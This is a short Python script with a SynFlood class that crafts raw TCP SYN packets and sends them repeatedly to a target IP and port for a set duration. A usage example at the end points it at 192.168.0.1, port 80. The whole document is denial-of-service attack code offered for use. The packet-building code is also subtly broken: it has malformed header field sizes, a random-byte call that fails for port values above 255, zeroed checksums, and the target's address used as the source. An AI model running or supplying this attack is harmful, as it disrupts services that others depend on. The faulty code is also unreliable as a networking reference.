import socket
import random
import time

class SynFlood:
    def __init__(self, target, port, duration, intensity):
        self.target = target
        self.port = port
        self.duration = duration
        self.intensity = intensity
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    def create_packet(self):
        ip_header = b"\x45\x00\x00\x28"
        ip_header += bytes([random.randint(0, 255)])  # Random identification
        ip_header += b"\x00\x00\x40\x06\x00\x00\x00\x00"  # Flags and TTL
        ip_header += socket.inet_aton(self.target)  # Source IP
        ip_header += socket.inet_aton(self.target)  # Destination IP

        tcp_header = bytes([random.randint(0, 65535)])  # Source Port
        tcp_header += bytes([self.port // 256, self.port % 256])  # Destination Port
        tcp_header += b"\x00\x00\x00\x00"  # Sequence Number
        tcp_header += b"\x00\x00\x00\x00"  # Acknowledgment Number
        tcp_header += b"\x50\x02\x71\x10"  # Data offset, flags, and window size
        tcp_header += b"\xe0\x00\x00\x00"  # Checksum and Urgent Pointer

        return ip_header + tcp_header

    def send_packets(self):
        for _ in range(self.intensity):
            packet = self.create_packet()
            self.sock.sendto(packet, (self.target, self.port))

    def start_attack(self):
        start_time = time.time()
        while time.time() - start_time < self.duration:
            self.send_packets()

    def stop_attack(self):
        self.sock.close()

# Usage example
if __name__ == "__main__":
    target_ip = "192.168.0.1"
    target_port = 80
    attack_duration = 60  # in seconds
    attack_intensity = 100

    syn_flood = SynFlood(target_ip, target_port, attack_duration, attack_intensity)
    syn_flood.start_attack()